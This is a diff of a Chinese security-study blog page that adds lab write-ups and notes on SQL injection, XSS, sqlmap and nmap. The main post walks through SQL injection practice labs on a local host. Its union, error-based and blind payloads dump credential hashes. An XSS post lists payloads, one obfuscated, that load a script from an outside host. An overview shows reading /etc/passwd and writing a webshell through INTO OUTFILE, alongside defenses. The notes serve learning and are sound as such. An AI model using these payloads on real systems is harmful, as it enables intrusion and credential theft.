@@ -50,7 +50,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Zoeken"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Søk"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -60,6 +60,311 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-注入练习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/09/18/注入练习/" class="article-date">
+  <time datetime="2016-09-18T07:44:26.245Z" itemprop="datePublished">2016-09-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>less-1 字符串注入</p>
+<p>?id=1’ and ‘1’=’1    判断id 是int型还是 字符串类型   you are in……  说明是字符串类型<br>?id=1’ order by 10/5/3/4 判断出查询的这张表有多少字段      by 3 的时候正常 说明有三个字段<br>?id=-1’  union select 1,2,3   判断显示位                   2，3为显示位</p>
+<p>准备就绪  开始获取想要的信息（数据库管理员的账号密码）</p>
+<p>获取mysql版本 </p>
+<p>?id=-1’  union select 1,2,(select versraion()) –+       得到版本信息为5.5.40   5.0以上都存在information_schema库</p>
+<p>在information_schema库中 获取库名 表名 字段名</p>
+<p>id=-1’  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) –+                   </p>
+<p> Your Login name:2<br>Your Password:information_schema,fsql,kppw26,mysql,paimai,performance_schema,rank,security,test              </p>
+<p>得到了所有的数据库名 查看想要的数据库的所有表 比如:(mysql)</p>
+<p>?id=-1’  union select 1,(select group_concat(distinct table_name) from information_schema.columns where table_schema=’mysql’),(select  group_concat(distinct table_schema) from information_schema.columns) –+</p>
+<p> Your Login name:columns_priv,db,event,func,general_log,help_category,help_keyword,help_relation,help_topic,host,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,servers,slow_log,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user<br>Your Password:information_schema,fsql,kppw26,mysql,paimai,performance_schema,rank,security,test </p>
+<p>查看想要的表的字段名 （mysql.user表中只需要user and password 即获得所有账号密码）</p>
+<p>?id=-1’  union select 1,2,(select  group_concat(column_name) from information_schema.columns where table_schema=’mysql’ and table_name=’user’) –+</p>
+<p> Your Login name:2<br>Your Password:Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routin</p>
+<p>获取数据库管理员的账号密码(密文)</p>
+<p>id=-1’  union select 1,2,(select  group_concat(User,Password) from mysql.user) –+</p>
+<p> Your Login name:2<br>Your Password:root<em>81F5E21E35407D884A6CD4A731AEBFB6AF209E1B,root</em>81F5E21E35407D884A6CD4A731AEBFB6AF209E1B,mr*2491CA5000A9614AA28C39036702D965584486EC</p>
+<p>md5加密解密<br>sha1加密解密<br>password()函数加密<br>得到mr账户的明文密码为 qwer<br>root用户的明文密码为 root</p>
+<p>本次注入成功</p>
+<p>less-2  整型注入    与less-1 方法一样</p>
+<p>less-5   报错注入</p>
+<p>先判断类型<br>?id=1’ and ‘1’=’1    字符串类型</p>
+<p>?id=1’ order by 4/3 –+    有3个字段</p>
+<p>?id=-1’ union select 1,2,3 –+        You are in………..   看来是没有显示位 那么使用报错注入</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-5/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-5/?id=1</a>‘ union select 1,count(<em>),floor(rand(0)</em>2)x from information_schema.columns group by  x–+        //（因为存在information_schema表所以可以直接使用）<br><a href="http://127.0.0.1/sqli/sqli/Less-5/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-5/?id=1</a>‘ union select 1,count(<em>),concat(version(),0x7e,floor(rand(0)</em>2))x from information_schema.columns group by  x–+</p>
+<p> Duplicate entry ‘1’ for key ‘group_key’   // 出现报错 在’1’位置创造显示位</p>
+<p> 查看当前使用的数据库名<br> ?id=1’ union select 1,count(<em>),concat(database(),0x7e,floor(rand(0)</em>2))x from information_schema.columns group by  x–+</p>
+<p>Duplicate entry ‘security~1’ for key ‘group_key’</p>
+<p>查询有多少库</p>
+<p>?id=1’ union select 1,count(<em>),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)</em>2))x from information_schema.columns group by  x–+</p>
+<p>Duplicate entry ‘9~1’ for key ‘group_key’</p>
+<p>查询数据库名  只能使用limit一个一个显示</p>
+<p>(select distinct table_schema from information_schema.columns limit 1,1)</p>
+<p>Duplicate entry ‘fsql~1’ for key ‘group_key’<br>Duplicate entry ‘security~1’ for key ‘group_key’</p>
+<p>查询security库中的表个数</p>
+<p>(select count(distinct table_name) from information_schema.columns where table_schema=’security’)</p>
+<p>Duplicate entry ‘4~1’ for key ‘group_key’</p>
+<p>查询security中的表的表名</p>
+<p>(select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1)</p>
+<p>Duplicate entry ‘emails~1’ for key ‘group_key’<br>Duplicate entry ‘referers~1’ for key ‘group_key’<br>Duplicate entry ‘uagents~1’ for key ‘group_key’<br>Duplicate entry ‘users~1’ for key ‘group_key’</p>
+<p>查询表中的表结构个数<br>(select count(distinct column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’)</p>
+<p>Duplicate entry ‘3~1’ for key ‘group_key’</p>
+<p>查询表结构</p>
+<p>(select distinct column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 0,1)</p>
+<p>Duplicate entry ‘id~1’ for key ‘group_key’<br>Duplicate entry ‘username~1’ for key ‘group_key’<br>Duplicate entry ‘password~1’ for key ‘group_key’</p>
+<p>获取 username and passwore</p>
+<p>(select concat(username,0x7e,password) from security.users limit 0,1)</p>
+<p>Duplicate entry ‘Dumb~Dumb~1’ for key ‘group_key’<br>Duplicate entry ‘Dummy~p@ssword~1’ for key ‘group_key’<br>Duplicate entry ‘secure~crappy~1’ for key ‘group_key’</p>
+<p>本次报错注入结束</p>
+<p>less-8   布尔型注入 (盲注)</p>
+<p>查询库名 表名 字段名 内容</p>
+<p>用到的函数 ： exists() 判断是否有返回值 （0，1）<br>              length() 查询字符串的长度<br>              substr(string,num start,num length)  查看字符串的某一段<br>              例如：mysql&gt; select substr((select database()),1,6);<br>                        +———————————+<br>                        | substr((select database()),1,6) |<br>                        +———————————+<br>                        | securi                          |<br>                        +———————————+<br>              ascii()  查询字符串的ascii码</p>
+<p>判断有多少个数据库</p>
+<p>(select count(distinct table_schema) from information_schema.columns)</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and ((select count(distinct table_schema) from information_schema.columns)&gt;8)<br> –+</p>
+<pre><code>回显正常 有9个数据库 
+</code></pre><p> 查询某个数据库库名：</p>
+<p> ①：判断库名长度 length()，②：substr() 一个一个查看字段 ③：ascii() 判断字段的ascii码</p>
+<p>select length((select distinct table_schema from information_schema.columns limit 0,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)<br> –+</p>
+<p> 回显正常 第一个数据库名长度为 18</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select distinct table_schema from information_schema.columns limit 1,1))&gt;3)<br>–+<br>回显正常 第二个数据库名长度为 4<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>②：substr() 一个一个查看字段 ③：ascii() 判断字段的ascii码</p>
+<p>select substr((select distinct table_schema from information_schema.columns limit 0,1),1,1)   </p>
+<p>select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))              //查找字段的第一个字母的ascii码</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104)<br>–+</p>
+<p>回显正常  得到数据库名的第一个字段的ascii码为 105</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),2,1))&gt;109)<br>–+<br>回显正常  得到数据库名的第二个字段的ascii码为 110<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>                            数据库名为 information_schema<br>                            第二个为   fsql</p>
+<pre><code>(下边步骤我们使用数据库为security)
+</code></pre><p>查询数据库中表名：</p>
+<p>select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1</p>
+<p>select length((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1))&gt;5)<br>–+</p>
+<p>回显正常  第一个表名的length为 6</p>
+<p>当前数据库第一个字符的ascii码</p>
+<p>select ascii(substr((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1),1,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1),1,1))&gt;100)<br>–+</p>
+<p>ascii 为101</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select distinct table_name from information_schema.columns where table_schema=’security’ limit 0,1),2,1))&gt;108)<br>–+</p>
+<p>ascii ：109<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>            .<br>                                表名： emails</p>
+<p>查询emails表中的字段名</p>
+<p>select length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 0,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 1,1))&gt;1)<br>–+</p>
+<p>length :8</p>
+<p>select ascii(substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 0,1),1,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 1,1),1,1))&gt;100)<br>–+</p>
+<p>ascii:101<br>                        ..<br>                        .<br>                        .<br>                        .</p>
+<pre><code>.
+.
+列名为 email_id
+</code></pre><p>查询 内容</p>
+<p>select email_id from security.emails limit 0,1</p>
+<p>select length((select email_id from security.emails limit 0,1))</p>
+<p>select ascii(substr((select email_id from security.emails limit 0,1),1,1))</p>
+<p><a href="http://127.0.0.1/sqli/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/sqli/Less-8/</a><br>?id=1’ and (select ascii(substr((select email_id from security.emails limit 0,1),1,1))&gt;67)<br>–+</p>
+<p>ascii:68<br>    .<br>    .<br>    .<br>    .<br>    .<br>    .<br>    .<br>    .</p>
+<pre><code>结果：security的emails表的email_id列的内容：Dumb@dhakkan.com
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/09/18/注入练习/" data-id="cit8bj90h0001d4qv5f4snlaj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/XSS/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/XSS/">XSS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表的英文缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者往web页面里插入恶意的html代码，当用户浏览该网页时候，嵌入该网页的html代码会被执行，从而达到攻击用户的目的。其重点已经不在’跨站’而是’脚本’,主要有两个：JavaScript和ActionScript</p>
+<p>产生原因：<br>    网页提供我们输入信息的表单，同时可以把我们输入的信息输出到网页上。我们输入的是一个字符串，但这个字符串也可以是标记语言格式的字符串。浏览器新人服务器返回的标记语言格式的字符串(html源代码)，所以直接渲染显示到浏览器上形成可视化界面。我们输入的恶意的标记语言格式的字符串达到攻击的目的。</p>
+<p>出现XSS：url的参数回显到网页上、form表单提交的内容出现在网页上，如昵称、邮件、简介、留言板等</p>
+<p>危害：<br>    可以利用XSS获取用户的Cookie、改变网页内容、URL跳转、有局限性的键盘记录。</p>
+<p>利用：<br>    1、反射型XSS<br>    2、储存型XSS<br>    3、DOM XSS：代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器的DOM解析，可以认为完全是客户端的事<br>    4、flash XSS：利用网页上的flash文件的缺陷来执行js脚本，一般是反射性XSS<br>    5、m XSS：突变XSS，主要用于过滤的绕过。</p>
+<p>发现XSS：<br>    1、反射型XSS：url参数中的值，能够回显到返回的html中，url的参数值没有被过滤或者是过滤不严格。<br>    2、储存型XSS：可以提交内容，提交内容能被管理员或其他用户查看，提交的内容没有被过滤或者过滤不严格。</p>
+<p>过滤：<br>    前端过滤、输入过滤、输出过滤。<br>    输入过滤：服务器脚本接收用户提交的数据后，写入到数据库中，之间对数据进行过滤，称之为输入过滤，一般采用黑白名单过滤，或者是对提交的数据进行html实体编码<br>    输出过滤：服务器脚本在显示数据时，需要从数据库中读取数据再返回数据包，之间进行过滤，称之为输出过滤。一般采用黑白名单，或对数据进行html实体编码。<br>    前端绕过：可以用burpsuite拦截数据包，改包绕过。</p>
+<p>绕过方式：<br>    &lt;&gt;被过滤，一般很难触发XSS漏洞，除非输入内容直接输入到”script \script”标签内。<br>    script被过滤 可以用img svg标签替换。特殊字符被过滤，编码ascii 16进制</p>
+<p>修复：<br>    1、对用户的输入进行严格的过滤，一般为基于黑白名单过滤。白名单过滤的防御效果更好，对于用户在白名单之外的输入，直接忽略。构造白名单的过程中需要尽量保证在不影响用户体验的同时，尽可能杜绝一切不必要的输入。<br>    2、Flash XSS修复需要对相应的flash进行修改或升级替换。<br>    3、在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时的损失。</p>
+<p>示例代码：</p>
+<pre><code>&lt;script src=&apos;http://b.ioio.pub/xss/probe.js&apos;&gt;&lt;/script&gt;
+&lt;img src=xonerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&apos;&quot;;&gt;
+&lt;svg onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&gt;
+&lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) &gt;
+</code></pre><p><br></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/XSS/" data-id="cit8afyyy0000wgqvp7c21u26" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CSRF" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/CSRF/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/CSRF/">CSRF</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><br></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/CSRF/" data-id="cit8afyz40001wgqv2vmech5x" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/SQL注入/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/SQL注入/">SQL 注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。</p>
+<p>产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p>
+<p>利用：可以利用sql注入获取数据包括用户数据后台管理账号密码等，如果有读写权限并知道网站的绝对路径，还可以load_file()读取文件内容、into outfile 写入webshell进行攻击，</p>
+<p>利用手法：</p>
+<ul>
+<li>url判断注入：<pre><code>and 1=1 / and 1=2 回显页面不同(整型判断)
+单引号‘显示数据库错误信息(整型、字符串类型判断) 
++1/-1回显上个页面（整型判断）
+and sleep(5) （判断网页返回时间）
+</code></pre></li>
+<li>读取文件： select load_file(‘/etc/passwd’)<pre><code>select load_file(&apos;D://xxxxx//phpstudy//WWW//1.txt&apos;)
+</code></pre></li>
+<li>写入：select ‘&lt;?php phpinfo(); ?&gt;’ into outfile ‘D://xxxxx//phpstudy//WWW//121.php’<pre><code>select &apos;&lt;?php phpinfo(); ?&gt;&apos; INTO OUTFILE &apos;/var/www/html/webshell.php&apos;;
+</code></pre></li>
+<li>获取绝对路径：php报错显示绝对路径、load_file()读取配置文件、phpinfo.php </li>
+</ul>
+<p>根据sql数据类型分类：</p>
+<ul>
+<li>字符串类型注入和整型注入、搜索类型注入</li>
+</ul>
+<p>根据注入语法注入：</p>
+<ul>
+<li>可联合查询注入：有显示位<pre><code>order by 判断列数
+union 1，2，3 判断显示位
+</code></pre>  例：<pre><code>?id=-1&apos;  union select 1,2,(select versraion()) --+
+?id=-1&apos;  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) --+                   
+</code></pre></li>
+<li><p>布尔型注入:页面存在注入，没有显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断来sql注入 </p>
+<pre><code>exists():检查子查询是否有返回值，返回True或False
+ascii():返回字符串str的最左边字符的ascii代码值，
+substr(string,numstart,numlength):
+</code></pre><p>  例：<br>  判断有多少个数据库：</p>
+<pre><code>?id=1&apos; and ((select count(distinct table_schema) from information_schema.columns)&gt;8) --+
+</code></pre><p>  查看第一个数据库字段的长度：</p>
+<pre><code>?id=1&apos; and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)
+</code></pre><p>  查看第一个数据库的第一个字符的ascii码：</p>
+<pre><code>?id=1&apos; and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104) --+
+</code></pre></li>
+</ul>
+<ul>
+<li>报错注入：有报错信息 mysql_error()<pre><code>count(*)
+concat()
+(floor(rand(0)*2))a
+group by a
+</code></pre>  例：<br>  查看版本信息：<pre><code>?id=1&apos; union select 1,count(*),concat(version(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x --+
+</code></pre>  查看有多少个库：<pre><code>?id=1&apos; union select 1,count(*),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)*2))x from information_schema.columns group by  x--+
+</code></pre>  查询数据库名(limit)<pre><code>(select distinct table_schema from information_schema.columns limit 1,1)
+</code></pre></li>
+</ul>
+<ul>
+<li>可多语句查询注入：<pre><code>sqlserver数据库
+例：http://hello.com/view?id=1;update t1 set content =&apos;aaaaaaaaa&apos;
+</code></pre></li>
+<li>基于时间延迟注入：<pre><code>sleep()
+</code></pre></li>
+<li>偏移注入、宽字节注入、二次注入</li>
+</ul>
+<p>防御：<br>     1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。<br>     2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>     3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>     4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>     5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>     6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFTSCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
+<p><br></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/SQL注入/" data-id="cit8bj9070000d4qvzr71b9ed" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-read_sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -83,11 +388,26 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p><br><br><img src="http://123.206.9.45/sqlmap.png" alt="sqlmap安装"><br><img src="http://123.206.9.45/sqlmap2.png" alt="2"><br><br></p>
+<h3 id="Options"><a href="#Options" class="headerlink" title="Options:"></a>Options:</h3><ul>
+<li>–version 显示版本信息并退出</li>
+<li>-h，–help 显示帮助信息</li>
+<li>-v verbose 回显级别：0-6 默认为1<pre><code>0:只显示python错误以及严重的信息
+1:同时显示基本信息和警告信息
+2:同时显示debug信息
+3:同时显示注入的payload
+4:同时显示http请求
+5:同时显示http响应头
+6:同时显示http响应页面
+</code></pre></li>
+</ul>
+<p><br></p>
+<h3 id="Target"><a href="#Target" class="headerlink" title="Target:"></a>Target:</h3><p>-u RUL 指定目标地址</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/16/read_sqlmap/" data-id="cisfbmpfd0002r8qvxnpth7a2" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2016/08/16/read_sqlmap/" data-id="cit7x4xjw00013sqvbjww2nd1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -150,7 +470,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/16/需要复习的知识/" data-id="cisfbmpfd0003r8qvihshgl3h" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2016/08/16/需要复习的知识/" data-id="cit7x4xjw00023sqvp3xxkk4i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -184,7 +504,7 @@
       
         <h4 id="导语："><a href="#导语：" class="headerlink" title="导语："></a>导语：</h4><p>nmap的英文全称是”Network Mapper”,nmap可以用来快速地扫描大型网络或单个主机。nmap主要有四个方面的扫描功能：主机发现、端口扫描、应用与版本侦测、操作系统侦测</p>
 <p><br></p>
-<h3 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h3><p>nmap -sn 192.168.1.100-200 //扫描局域网192.168.1.100-192.168.1.200范围内活动的IP主机<br>nmap -v //显示过程<br>nmap -A //进行完整全面的扫描：主机发现、端口扫描、应用与版本侦测、操作系统侦测<br>nmap -n/-R //不进行DNS解析/总是解析</p>
+<h3 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h3><p>nmap -sn 192.168.1.100-200 //扫描局域网192.168.1.100-192.168.1.200范围内活动的IP主机<br>nmap -v //显示过程<br>nmap -A //进行完整全面的扫描：主机发现、端口扫描、应用与版本侦测、操作系统侦测<br>nmap -n/-R //不进行DNS解析/总是解析<br>nmap -iL   –指定ip.txt</p>
 <h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><ul>
 <li>nmap -sS            #使用TCP SYN方式对目标主机进行扫描TCP端口</li>
 <li>nmap -sU            #使用UDP扫描方式确定主机UDP端口</li>
@@ -235,7 +555,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/nmap常用命令/" data-id="cisfbmpey0000r8qvjf6h20iw" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2016/08/11/nmap常用命令/" data-id="cit7x4xjg00003sqvbwcxecpj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -280,7 +600,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/sugar/" data-id="cisfbmpfd0001r8qvzyal2w25" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2016/08/11/sugar/" data-id="cit7x4xkr00043sqvu4qz3awv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -305,9 +625,9 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archieven</h3>
+    <h3 class="widget-title">Arkiv</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
     </div>
   </div>
 
@@ -315,24 +635,28 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recente berichten</h3>
+    <h3 class="widget-title">Siste innlegg</h3>
     <div class="widget">
       <ul>
         
           <li>
+            <a href="/2016/09/18/注入练习/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/XSS/">XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/CSRF/">CSRF</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/SQL注入/">SQL 注入</a>
+          </li>
+        
+          <li>
             <a href="/2016/08/16/read_sqlmap/">Read_Sqlmap</a>
-          </li>
-        
-          <li>
-            <a href="/2016/08/16/需要复习的知识/">需要掌握的知识</a>
-          </li>
-        
-          <li>
-            <a href="/2016/08/11/nmap常用命令/">Read_nmap</a>
-          </li>
-        
-          <li>
-            <a href="/2016/08/11/sugar/">sugar</a>
           </li>
         
       </ul>
